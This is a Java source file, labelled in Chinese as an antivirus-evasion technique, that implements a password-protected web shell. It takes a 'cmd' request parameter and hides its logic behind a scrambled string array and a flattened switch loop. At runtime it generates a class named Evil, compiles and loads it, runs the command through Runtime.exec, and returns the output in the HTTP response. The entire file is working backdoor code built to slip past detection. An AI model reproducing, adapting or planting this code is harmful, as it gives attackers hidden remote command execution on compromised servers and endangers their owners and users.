package org.sec.util;

/**
 * Javac动态编译免杀
 */
public class Javac {
    public static void main(String[] args) {
        try {
            String[] globalArr = new String[]{"0|1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16|17|18|19|20|21|22|23|24|25|26|27|28|29|30|31|32", "cmd", "xxxxx", "import java.io.BufferedReader;\n", "import java.io.IOException;\n", "import java.io.InputStream;\n", "import java.io.InputStreamReader;\n", "public class Evil", "   public static String result = \"\";\n", "   public Evil", "() throws Throwable  {\n", "        StringBuilder stringBuilder = new StringBuilder();\n", "        try {", "               BufferedReader bufferedReader = new BufferedReader", "(new InputStreamReader(Runtime.getRuntime().exec(\"", "\").getInputStream()));\n", "               String line;\n", "               while((line = bufferedReader.readLine()) != null) {\n", "                       stringBuilder.append(line).append(System.getProperty(\"line.separator\"));\n", "               }\n", "               result = stringBuilder.toString();\n", "        } catch (Exception e) {\n", "              e.printStackTrace();\n", "        }\n", "        throw new Throwable(stringBuilder.toString());", "   }\n", "}", "Evil", ".java", "file:", "<pre>", "</pre>", "pwd"};
            String temp = globalArr[0];
            String[] b = temp.split("\\|");
            String c = null;
            String tmpPath = null;
            JavaCompiler javaCompiler = null;
            DiagnosticCollector<JavaFileObject> diagnostics = null;
            StandardJavaFileManager standardJavaFileManager = null;
            StringBuilder stringBuilder = null;
            Iterable fileObject = null;
            URLClassLoader loader = null;
            int id = 0;
            int index = 0;
            while (true) {
                int op = Integer.parseInt(b[index++]);
                switch (op) {
                    case 0:
                        c = request.getParameter(globalArr[1]);
                        break;
                    case 1:
                        if (!request.getParameter(globalArr[32]).equals(PASSWORD)) {
                            return;
                        }
                        tmpPath = Files.createTempDirectory(globalArr[2]).toFile().getPath();
                        break;
                    case 2:
                        javaCompiler = ToolProvider.getSystemJavaCompiler();
                        break;
                    case 3:
                        diagnostics = new DiagnosticCollector();
                        break;
                    case 4:
                        standardJavaFileManager = javaCompiler
                                .getStandardFileManager(diagnostics, Locale.CHINA, Charset.forName("utf-8"));
                        break;
                    case 5:
                        id = new Random().nextInt(10000000);
                        break;
                    case 6:
                        stringBuilder = new StringBuilder();
                        break;
                    case 7:
                        stringBuilder.append(globalArr[3]);
                        break;
                    case 8:
                        stringBuilder.append(globalArr[4]);
                        break;
                    case 9:
                        stringBuilder.append(globalArr[5]);
                        break;
                    case 10:
                        stringBuilder.append(globalArr[6]);
                        break;
                    case 11:
                        stringBuilder.append(globalArr[7] + id + " {\n");
                        break;
                    case 12:
                        stringBuilder.append(globalArr[8]);
                        break;
                    case 13:
                        stringBuilder.append(globalArr[9] + id + globalArr[10]);
                        break;
                    case 14:
                        stringBuilder.append(globalArr[11]);
                        break;
                    case 15:
                        stringBuilder.append(globalArr[12]);
                        break;
                    case 16:
                        stringBuilder.append(globalArr[13] +
                                globalArr[14] + c + globalArr[15]);
                        break;
                    case 17:
                        stringBuilder.append(globalArr[16]);
                        break;
                    case 18:
                        stringBuilder.append(globalArr[17]);
                        break;
                    case 19:
                        stringBuilder.append(globalArr[18]);
                        break;
                    case 20:
                        stringBuilder.append(globalArr[19]);
                        break;
                    case 21:
                        stringBuilder.append(globalArr[20]);
                        break;
                    case 22:
                        stringBuilder.append(globalArr[21]);
                        break;
                    case 23:
                        stringBuilder.append(globalArr[22]);
                        break;
                    case 24:
                        stringBuilder.append(globalArr[23]);
                        break;
                    case 25:
                        stringBuilder.append(globalArr[24]);
                        break;
                    case 26:
                        stringBuilder.append(globalArr[25]);
                        break;
                    case 27:
                        stringBuilder.append(globalArr[26]);
                        break;
                    case 28:
                        Files.write(Paths.get(tmpPath + File.separator + globalArr[27] + id + globalArr[28]),
                                stringBuilder.toString().getBytes());
                        break;
                    case 29:
                        fileObject = standardJavaFileManager.getJavaFileObjects(
                                tmpPath + File.separator + globalArr[27] + id + globalArr[28]);
                        break;
                    case 30:
                        javaCompiler.getTask(null, standardJavaFileManager, diagnostics,
                                null, null, fileObject).call();
                        break;
                    case 31:
                        loader = new URLClassLoader(new URL[]{new URL(globalArr[29] + tmpPath + File.separator)});
                        break;
                    case 32:
                        try {
                            loader.loadClass(globalArr[27] + id).newInstance();
                        } catch (Throwable e) {
                            response.getOutputStream().write(globalArr[30].getBytes());
                            response.getOutputStream().write(e.getMessage().getBytes());
                            response.getOutputStream().write(globalArr[31].getBytes());
                        }
                        break;
                }
            }
        } catch (Exception ignored) {

        }
    }
}